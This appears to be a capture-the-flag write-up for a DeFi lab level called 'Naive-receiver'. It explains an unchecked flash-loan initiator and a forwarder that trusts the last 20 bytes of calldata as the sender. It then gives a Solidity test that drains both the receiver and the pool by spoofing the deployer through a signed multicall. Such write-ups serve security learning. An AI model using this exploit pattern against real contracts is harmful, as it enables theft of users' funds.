# 2. Naive-receiver

The exploits used in this level are:

## ERC-3156 Flash loans

- In the receiver contract we have no check for the initiator address
- https://www.rareskills.io/post/erc-3156

## Access Control error

```solidity
if (msg.sender == trustedForwarder && msg.data.length >= 20) {
            return address(bytes20(msg.data[msg.data.length - 20:]));
        } else {
            return super._msgSender();
        }
```

## Other useful info for this level: EIP-712

- https://www.cyfrin.io/blog/understanding-ethereum-signature-standards-eip-191-eip-712

## Solution

```solidity
function test_naiveReceiver() public checkSolvedByPlayer {
    bytes[] memory callDatas = new bytes[](11);

    // Encode 10 flash loan calls to drain the receiver
    for (uint256 i = 0; i < 10; i++) {
        callDatas[i] = abi.encodeCall(NaiveReceiverPool.flashLoan, (receiver, address(weth), 0, bytes("")));
    }

    // Encode withdraw call to drain the pool
    callDatas[10] = abi.encodePacked(
        abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
        bytes32(uint256(uint160(deployer)))
    );

    bytes memory multicallData = abi.encodeCall(pool.multicall, (callDatas));

    BasicForwarder.Request memory request = BasicForwarder.Request({
        from: player,
        target: address(pool),
        value: 0,
        gas: gasleft(),
        nonce: forwarder.nonces(player),
        deadline: block.timestamp + 1 days,
        data: multicallData
    });

    bytes32 hashedRequest =
        keccak256(abi.encodePacked("\x19\x01", forwarder.domainSeparator(), forwarder.getDataHash(request)));

    (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, hashedRequest);
    bytes memory signature = abi.encodePacked(r, s, v);

    forwarder.execute(request, signature);
}
```
